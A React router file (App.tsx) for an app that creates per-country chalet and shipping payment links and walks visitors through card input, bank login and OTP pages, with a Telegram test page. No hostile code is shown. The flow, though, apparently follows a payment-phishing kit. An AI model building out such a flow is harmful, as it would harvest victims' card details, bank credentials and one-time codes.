import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import Index from "./pages/Index";
import Services from "./pages/Services";
import CreateChaletLink from "./pages/CreateChaletLink";
import CreateShippingLink from "./pages/CreateShippingLink";
import LinkCreated from "./pages/LinkCreated";
import Microsite from "./pages/Microsite";
import PaymentRecipient from "./pages/PaymentRecipient";
import PaymentDetails from "./pages/PaymentDetails";
import PaymentBankSelector from "./pages/PaymentBankSelector";
import PaymentCardInput from "./pages/PaymentCardInput";
import PaymentBankLogin from "./pages/PaymentBankLogin";
import PaymentCardForm from "./pages/PaymentCardForm";
import PaymentOTPForm from "./pages/PaymentOTPForm";
import PaymentReceiptPage from "./pages/PaymentReceiptPage";
import TelegramTestPage from "./pages/TelegramTestPage";
import SupabaseTest from "./pages/SupabaseTest";
import NotFound from "./pages/NotFound";

const queryClient = new QueryClient();

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Index />} />
          <Route path="/services" element={<Services />} />
          <Route path="/create/:country/chalet" element={<CreateChaletLink />} />
          <Route path="/create/:country/shipping" element={<CreateShippingLink />} />
          <Route path="/link-created/:id" element={<LinkCreated />} />
          <Route path="/r/:country/:type/:id" element={<Microsite />} />
          <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
          <Route path="/pay/:id/details" element={<PaymentDetails />} />
          {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
          <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
          <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
          <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
          {/* Legacy routes (kept for backwards compatibility) */}
          <Route path="/pay/:id/card" element={<PaymentCardForm />} />
          <Route path="/pay/:id/otp" element={<PaymentOTPForm />} />
          <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
          <Route path="/telegram-test" element={<TelegramTestPage />} />
          <Route path="/supabase-test" element={<SupabaseTest />} />
          <Route path="*" element={<NotFound />} />
        </Routes>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
